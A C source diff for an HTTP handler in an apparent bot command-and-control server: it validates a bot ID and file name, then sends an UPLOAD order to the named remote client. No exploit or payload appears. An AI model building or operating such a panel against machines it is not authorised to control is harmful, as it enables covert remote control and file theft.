@@ -77,14 +77,53 @@ void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
 }
 
 void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
-    char bot_id[256] = {0}; // Declare bot_id
-    char cmd_id[64] = {0};
-    char program[256] = {0};
-    char params[256] = {0};
-    int delay = 0;
-    int expected_code = 0;
-    char delay_str[16] = {0};
-    char expected_code_str[16] = {0};
+    char bot_id[256] = {0};
+    char file_name[256] = {0};
+
+    // Parse fields from the POST request
+    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
+    mg_http_get_var(&hm->body, "file_name", file_name, sizeof(file_name));
+
+    // Validate required fields
+    if (strlen(bot_id) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
+        return;
+    }
+
+    if (strlen(file_name) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File name is required\"}");
+        return;
+    }
+
+    // Find the target client
+    Client *client = find_client(&hash_table, bot_id);
+    if (client == NULL) {
+        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
+        return;
+    }
+
+    // Build the Command struct
+    Command cmd = {
+        .cmd_id = "UPLOAD",
+        .order_type = UPLOAD,
+        .delay = 0,
+        .program = strdup("UPLOAD"),
+        .expected_exit_code = 0,
+        .params = malloc(2 * sizeof(char *)) // Allocate space for params
+    };
+
+    cmd.params[0] = strdup(file_name); // Add the file name as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
+
+    // Send the command to the client
+    if (send_command(client->socket, &cmd) < 0) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send upload command to client\"}");
+        free_command(&cmd); // Free dynamically allocated fields
+        return;
+    }
+
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
+    free_command(&cmd); // Free dynamically allocated fields
 }
 
 // Function to handle sending a command to a client
